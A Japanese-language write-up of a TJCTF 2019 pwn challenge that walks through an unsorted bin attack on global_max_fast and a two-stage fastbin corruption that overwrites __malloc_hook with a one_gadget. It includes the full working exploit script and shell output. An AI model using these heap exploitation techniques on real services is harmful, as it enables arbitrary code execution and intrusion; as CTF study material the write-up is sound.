# [pwn 180pts] House of Horror 2 - TJCTF 2019
PIE以外有効です。
```
$ checksec -f house_of_horror_2
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      Yes	0		1	house_of_horror_2
```

一見House of Horroと同じように見えますが、指定できるサイズは15〜127になりました。（つまりmallocされるサイズは0x79〜0x400まで。）
libc leakは前回と同じようにできます。

さて、サイズが大きくなったのでfastbinが使えません。
いろいろ調べると0CTFのzerostorageという問題が似ていて、unsorted bin attackで`global_max_fast`を大きな値にすることで大きいサイズでもfastbinに入るようにしてやります。

`global_max_fast`を変更したら、次に`__malloc_hook`を変更します。
`__malloc_hook - 0x175`にサイズとして使えそうなデータがありました。
```
(gdb) x/32xg 0x00007fe6d69f1b10 - 0x175
0x7fe6d69f199b <_IO_2_1_stdin_+187>:	0xffffff0000000000	0x00000000000000ff
0x7fe6d69f19ab <_IO_2_1_stdin_+203>:	0x0000000000000000	0x9f06e00000000000
0x7fe6d69f19bb <_IO_2_1_stdin_+219>:	0x00000000007fe6d6	0x0000000000000000
0x7fe6d69f19cb <_IO_wide_data_0+11>:	0x0000000000000000	0x0000000000000000
0x7fe6d69f19db <_IO_wide_data_0+27>:	0x0000000000000000	0x0000000000000000
0x7fe6d69f19eb <_IO_wide_data_0+43>:	0x0000000000000000	0x0000000000000000
...
```
ただし、ここからサイズ0xe8以内には`__malloc_hook`は無いので、2段階で書き込んでやる必要があります。
まずはこの場所から0xe0ほど先にサイズとして使える0xf1を用意します。

```python
from ptrlib import *
import ctypes

def create_array(size):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("> ", str(size))

def delete_array(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter("> ", str(index))

def view_element(index, offset):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("> ", str(index))
    sock.sendlineafter("> ", str(offset))
    return sock.recvline().rstrip()

def edit_element(index, offset, value):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("> ", str(index))
    sock.sendlineafter("> ", str(offset))
    sock.sendlineafter("> ", str(value))

libc = ELF("./libc.so.6")
#sock = Socket("p1.tjctf.org", 8001)
sock = Socket("127.0.0.1", 9999)
main_arena = 0x3c4b20
global_max_fast = 3958776
delta = 0x58
one_gadget = 0xf1147

# libc leak
create_array(0x80 // 8) # 0
create_array(0x80 // 8) # 1
delete_array(0)
libc_base = int(view_element(0, 0), 10) - main_arena - delta
logger.info("libc base = " + hex(libc_base))
logger.info("global_max_fast = " + hex(libc_base + global_max_fast))

# allocate for future use
create_array(0xe0 // 8) # 2
create_array(0xe0 // 8) # 3
create_array(0xe0 // 8) # 4

# unsorted bin attack on global_max_fast
create_array(0x90 // 8) # 5
create_array(0xa0 // 8) # 6
delete_array(5)
edit_element(0, (0xf0 * 3 + 0x90 + 0x90) // 8, libc_base + global_max_fast - 0x10)
create_array(0x90 // 8) # 7

# fastbin corruption attack (Stage 1)
delete_array(2)
delete_array(3)
delete_array(4)
# fastbin-->4-->3-->2
edit_element(3, 0xe8 // 8, libc_base + libc.symbol("__malloc_hook") - 0x175)
# fastbin-->7-->__malloc_hook-0x175
create_array(0xe0 // 8) # 8
create_array(0xe0 // 8) # 9
edit_element(9, 0xd8 // 8, 0xf1 << 40)

# fastbin corruption attack (Stage 2)
delete_array(4)
# fastbin-->4-->?
edit_element(3, 0xe8 // 8, libc_base + libc.symbol("__malloc_hook") - 0x88)
# fastbin-->4-->__malloc_hook-0x88
create_array(0xe0 // 8) # 10
create_array(0xe0 // 8) # 11
edit_element(11, 0x70 // 8, libc_base + one_gadget)

# get the shell!
create_array(0x100 // 8)

sock.interactive()
```

できたー！
```
$ python solve.py 
[+] __init__: Successfully connected to p1.tjctf.org:8012
[+] <module>: libc base = 0x7fbe7bc35000
[+] <module>: global_max_fast = 0x7fbe7bffb7f8
[ptrlib]$ ls
[ptrlib]$ flag.txt
house_of_horror_2
libc.so.6
wrapper
  
[ptrlib]$ cat flag.txt
[ptrlib]$ 
tjctf{1_w0nder_if_any0ne_w1ll_use_h0use_of_or4nge}[ptrlib]$
```

フラグにはhouse of orangeと書いてあるので非想定解だった...？

# 感想
初めて使う攻撃で凄い勉強になりました。
unsorted binからglobal_max_fastをいじるのは今後使えそう。
2段階でfastbin corruption attackするという構想も上手くいったので楽しかったです。
